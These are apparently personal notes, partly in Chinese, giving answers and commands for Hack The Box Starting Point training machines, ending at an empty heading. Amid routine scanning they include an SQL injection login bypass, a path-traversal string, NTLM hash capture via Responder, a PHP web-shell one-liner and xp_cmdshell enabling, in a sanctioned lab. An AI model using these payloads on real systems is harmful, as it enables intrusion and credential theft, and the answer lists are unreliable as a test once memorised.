[Tier0](https://github.com/johnie123456789/Hack_The_Box_note/blob/main/Start_point.md#tier0)

[Tier1](https://github.com/johnie123456789/Hack_The_Box_note/blob/main/Start_point.md#tier1)

[Tier2](https://github.com/johnie123456789/Hack_The_Box_note/blob/main/Start_point.md#tier2)

# Tier0
## Meow

+  連VPN(用Kali OR Parrot)
   ```
   sudo openvpn + XXX.ovpn
   ```
+  開機
1. Virtual Machine
2. terminal
3. openvpn
4. tun
5. ping
   ```
   ping IP
   ```
6. nmap
   ```
   nmap -sV IP 
   ```
7. telnet
   ```
   telnet IP
   ```
8. root
9. cat
   ```
   cat flag.txt
   ```

## Fawn
1. File Transfer Protocol
2. 21
3. SFTP
4. ping
5. nmap (Thanks)
   ```
   nmap -sV IP 
   ```
6. nmap
   ```
   nmap -sV IP 
   ```
7. ftp -h
8. anonymous
9.  230
10. ls
11. get
12. 退出並cat flag
   ```
   close
   exit
   cat flag.txt
   ```

## Dancing
1. Server Message Block
2. 445
3. microsoft-ds
4. -L
5. smbclient -L IP
6. WorkShares
7. get
8. ```smbclient \\\\IP\\WorkShares```
   多逛逛，多get，就會有flag了

## Redeemer
1. 6379
   ```
   nmap -sV  -p- 10.129.18.32 -min-rate 5000

   ```
2. redis
3. In-memory Database
4. redis-cli
5. -h
6. 連線
   ```
   redis-cli -h 10.129.18.32
   ```
7. info
8. select
9. 4
10. keys *
11. get flag
# Tier1
## Appointment
1. Structured Query Language
2. SQL injection
3. Personally identifiable information
4. A03:2021-injection
5. nmap
   (Apache httpd 2.4.38 ((Debian)))
6. 443
7. directory
8. 404
9. dir
10. \#
11. sql injection
12. sql injection
    
    打開瀏覽器用IP連線
    在user輸入payload
    payload:
    ```
    admin' #
    ```
    flag和第11題答案就會出現了

## Sequel
1. nmap
2. nmap -sC -T4
3. -u
4. root
5. * 
6. ;
7. 連線
   ```
   mysql -h IP -u root
   SHOW DATABASES;
   ```
   Ansewer:htb
8. payload
   ```
   USE htb
   SELECT * FROM config;
   ```
## Crocodile
1. -sC
2. nmap -sV -sC IP
3. 230
4. anonymous
5. get
6. admin
7. Apache httpd 2.4.41
8. -x
   ```
   gobuster dir --url 網址 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php.html
   ```
9. login.php
10. 登入
    ![](asserts/picture1.png)

## Responder
1. unika.htb
2. php
3. 連線
   linux:
      ```
      echo "ip unika.htb" |sudo tee -a /etc/hosts
      ```
   Answer:page
4. ../../../../../../../../windows/system32/drivers/etc/hosts
5. //10.10.14.6/somefile
6. New Technology LAN Manager
7. -I
   ```
   sudo responder -I tun0
   ```
8. John the Ripper
9.  badminton
10. netstat -aon
11. ```type C:\Users\mike\Desktop\flag.txt ```

## Three
1. nmap -sT -sV -sC
2. thetoppers.htb
3. /etxc/hosts
4. s3.thetoppers.htb
5. AMAZON S3 
6. awscli
7. aws configure
8. aws s3 ls
9. php
    ```
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
10. cat /var/www/flag.txt

# Tier2
## Arcetype
1. 1433
2. ```smbclient -M -L IP```
3. ```smbclient -N \\\\10.129.84.75\\backups```
4. mssqlclient.py 
5. xp_cmdshell
6. winPeas
要設定才能執行xp_cmdshell
payload:
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
7. ConsoleHost_history.txt
8. C:\Users\sql_svc\Desktop\user.txt
9. C:\Users\Administrator\Desktop\root.txt

## Oopsie
1. 
